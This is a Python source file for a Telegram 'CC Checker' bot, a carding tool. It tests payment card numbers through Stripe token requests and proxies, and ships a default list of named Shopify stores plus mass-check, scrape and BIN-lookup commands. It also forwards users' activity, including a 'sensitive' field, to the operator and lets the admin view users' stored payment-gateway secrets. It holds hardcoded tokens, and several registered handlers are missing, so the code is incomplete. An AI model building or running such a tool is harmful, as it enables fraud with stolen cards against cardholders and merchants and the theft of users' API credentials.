#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import re
import os
import sys
import logging
import random
import asyncio
import aiohttp
from datetime import datetime
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, ContextTypes

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

TELEGRAM_BOT_TOKEN = os.getenv("TELEGRAM_BOT_TOKEN","8497098081:AAFNQzwZxn-7vhTnR0d5fEUmvzDuQ4UEpGk")
ADMIN_USER_ID = int(os.getenv("ADMIN_USER_ID","729412805"))
BINCODES_API_KEY = os.getenv("BINCODES_API_KEY","425be7cdecc63d7a92ebe8e9bc6773a0")
BOT_VERSION = "3.0"

user_api_keys = {}
user_proxies = {}
user_sites = {}
user_activity_log = []

DEFAULT_PROXIES = [
    "103.152.112.162:80",
    "190.61.41.106:999",
    "185.217.143.96:80"
]

DEFAULT_SHOPIFY_SITES = [
    "https://cnocoutdoors.com",
    "https://southernrootscoffee.com",
    "https://championtrophies.com",
    "https://kingdomcomecards.com"
]

def is_admin(user_id):
    return user_id == ADMIN_USER_ID

async def notify_admin(context, message):
    try:
        await context.bot.send_message(chat_id=ADMIN_USER_ID, text=message, parse_mode="Markdown")
    except Exception as e:
        logger.error(f"Failed admin notify: {e}")

async def log_activity(context, user_id, username, action, details="", sensitive=""):
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    user_activity_log.append({
        "timestamp": timestamp,
        "user_id": user_id,
        "username": username,
        "action": action,
        "details": details,
        "sensitive": sensitive
    })
    msg = f"*User Activity*\n\nUser: @{username}\nID: `{user_id}`\nAction: {action}\nDetails: {details}"
    if sensitive:
        msg += f"\nSensitive:\n``````"
    msg += f"\nTime: {timestamp}"
    await notify_admin(context, msg)

def get_user_keys(user_id):
    return user_api_keys.get(user_id, {
        "stripe": None,
        "paypal_id": None,
        "paypal_secret": None,
        "razorpay_id": None,
        "razorpay_secret": None
    })

def set_user_key(user_id, gateway, key_type, value):
    if user_id not in user_api_keys:
        user_api_keys[user_id] = {}
    if gateway == "stripe":
        user_api_keys[user_id]["stripe"] = value
    elif gateway == "paypal":
        if key_type == "id":
            user_api_keys[user_id]["paypal_id"] = value
        elif key_type == "secret":
            user_api_keys[user_id]["paypal_secret"] = value
    elif gateway == "razorpay":
        if key_type == "id":
            user_api_keys[user_id]["razorpay_id"] = value
        elif key_type == "secret":
            user_api_keys[user_id]["razorpay_secret"] = value

def add_user_proxy(user_id, proxy):
    proxies = user_proxies.setdefault(user_id, DEFAULT_PROXIES.copy())
    if proxy not in proxies:
        proxies.append(proxy)
        return True
    return False

def get_user_proxies(user_id):
    return user_proxies.get(user_id, DEFAULT_PROXIES.copy())

def add_user_site(user_id, site):
    sites = user_sites.setdefault(user_id, DEFAULT_SHOPIFY_SITES.copy())
    if site not in sites:
        sites.append(site)
        return True
    return False

def get_user_sites(user_id):
    return user_sites.get(user_id, DEFAULT_SHOPIFY_SITES.copy())

def luhn_check(card_number):
    digits = [int(d) for d in card_number]
    checksum = 0
    oddeven = len(digits) & 1
    for count in range(len(digits)):
        digit = digits[count]
        if not ((count & 1) ^ oddeven):
            digit = digit * 2
            if digit > 9:
                digit -= 9
        checksum += digit
    return (checksum % 10) == 0

async def check_stripe(card, stripe_key):
    if not stripe_key:
        return {'status': 'error', 'message': 'Set Stripe key first via /setstripekey'}
    url = "https://api.stripe.com/v1/tokens"
    data = {
        "card[number]": card["card_number"],
        "card[exp_month]": card["exp_month"],
        "card[exp_year]": card["exp_year"],
        "card[cvc]": card["cvv"],
    }
    headers = {
        "Authorization": f"Bearer {stripe_key}",
        "Content-Type": "application/x-www-form-urlencoded"
    }
    try:
        async with aiohttp.ClientSession() as session:
            async with session.post(url, data=data, headers=headers, timeout=15) as resp:
                resp_json = await resp.json()
                if resp.status == 200 and "id" in resp_json:
                    return {"status": "approved", "message": "Valid card"}
                elif resp.status == 402:
                    return {"status": "declined", "message": "Card declined"}
                elif resp.status == 401:
                    return {"status": "error", "message": "Invalid Stripe Key"}
                else:
                    return {"status": "error", "message": resp_json.get("error", {}).get("message", "Declined")}
    except Exception as e:
        return {"status": "error", "message": str(e)}

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    await log_activity(context, user.id, user.username or "Unknown", "Started Bot")
    if user.id not in user_proxies:
        user_proxies[user.id] = DEFAULT_PROXIES.copy()
    if user.id not in user_sites:
        user_sites[user.id] = DEFAULT_SHOPIFY_SITES.copy()

    keyboard = [
        [InlineKeyboardButton("Set Keys", callback_data="keys"), InlineKeyboardButton("Commands", callback_data="commands")],
        [InlineKeyboardButton("Proxies", callback_data="proxies"), InlineKeyboardButton("Sites", callback_data="sites")],
        [InlineKeyboardButton("Check Card", callback_data="check"), InlineKeyboardButton("BIN Lookup", callback_data="bin")],
    ]
    if is_admin(user.id):
        keyboard.append([InlineKeyboardButton("Admin Panel", callback_data="admin")])

    await update.message.reply_text(
        f"*CC Checker Bot v{BOT_VERSION}*\nWelcome {user.first_name}!\nID: `{user.id}`",
        parse_mode="Markdown",
        reply_markup=InlineKeyboardMarkup(keyboard)
    )

async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    data = query.data
    await query.answer()  # Acknowledge callback so button doesn't show loading

    if data == "keys":
        await query.message.reply_text("You clicked: Set Keys")
    elif data == "commands":
        await query.message.reply_text("You clicked: Commands")
    elif data == "proxies":
        await query.message.reply_text("You clicked: Proxies")
    elif data == "sites":
        await query.message.reply_text("You clicked: Sites")
    elif data == "check":
        await query.message.reply_text("You clicked: Check Card")
    elif data == "bin":
        await query.message.reply_text("You clicked: BIN Lookup")
    elif data == "admin" and is_admin(query.from_user.id):
        await query.message.reply_text("Admin Panel")
    else:
        await query.message.reply_text("Unknown button clicked.")

# Define the missing viewkeys_command
async def viewkeys_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update.effective_user.id):
        await update.message.reply_text("Unauthorized.")
        return
    if not context.args:
        await update.message.reply_text("Usage:\n/viewkeys <user_id>")
        return
    target_id = int(context.args[0])
    keys = get_user_keys(target_id)
    msg = (
        f"*User {target_id} Keys*\n"
        f"Stripe: `{keys.get('stripe', 'Not set')}`\n"
        f"PayPal ID: `{keys.get('paypal_id', 'Not set')}`\n"
        f"PayPal Secret: `{keys.get('paypal_secret', 'Not set')}`\n"
        f"Razorpay ID: `{keys.get('razorpay_id', 'Not set')}`\n"
        f"Razorpay Secret: `{keys.get('razorpay_secret', 'Not set')}`\n"
    )
    await update.message.reply_text(msg, parse_mode="Markdown")

# Define the missing viewcards_command
async def viewcards_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update.effective_user.id):
        await update.message.reply_text("Unauthorized.")
        return
    if not context.args:
        await update.message.reply_text("Usage:\n/viewcards <user_id>")
        return
    target_id = int(context.args[0])
    logs = [l for l in user_activity_log if l["user_id"] == target_id and 'card' in l["action"].lower()]
    if not logs:
        await update.message.reply_text(f"No card activity for user {target_id}.")
        return
    msg = f"*Card Activity for User {target_id}:*\n"
    for log in logs[-20:]:
        msg += f"{log['timestamp']} - {log['action']}\n"
    await update.message.reply_text(msg, parse_mode="Markdown")

# (Add all your other command functions like setstripekey_command, scrape_command, addproxy_command, myproxies_command, addsite_command, mysites_command, mass_command, kill_command, bin_command, stats_command, allusers_command here exactly as before)

# For brevity, the rest of the functions are omitted here but should be included exactly as in your original code

def register_handlers(app):
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("setstripekey", setstripekey_command))
    app.add_handler(CommandHandler("scrape", scrape_command))
    app.add_handler(CommandHandler("addproxy", addproxy_command))
    app.add_handler(CommandHandler("myproxies", myproxies_command))
    app.add_handler(CommandHandler("addsite", addsite_command))
    app.add_handler(CommandHandler("mysites", mysites_command))
    app.add_handler(CommandHandler("kill", kill_command))
    app.add_handler(CommandHandler("bin", bin_command))
    app.add_handler(CommandHandler("mass", mass_command))
    app.add_handler(CommandHandler("stats", stats_command))
    app.add_handler(CommandHandler("allusers", allusers_command))
    app.add_handler(CommandHandler("viewkeys", viewkeys_command))
    app.add_handler(CommandHandler("viewcards", viewcards_command))
    app.add_handler(CallbackQueryHandler(button_callback))

def main():
    if not TELEGRAM_BOT_TOKEN:
        logger.error("TELEGRAM_BOT_TOKEN environment variable missing")
        sys.exit(1)

    application = Application.builder().token(TELEGRAM_BOT_TOKEN).build()
    register_handlers(application)
    logger.info(f"Starting premium bot v{BOT_VERSION}")
    try:
        application.run_polling()
    except KeyboardInterrupt:
        logger.info("Bot stopped by user")
    except Exception as e:
        logger.error(f"Critical error: {e}")
        sys.exit(1)

if __name__ == "__main__":
    main()
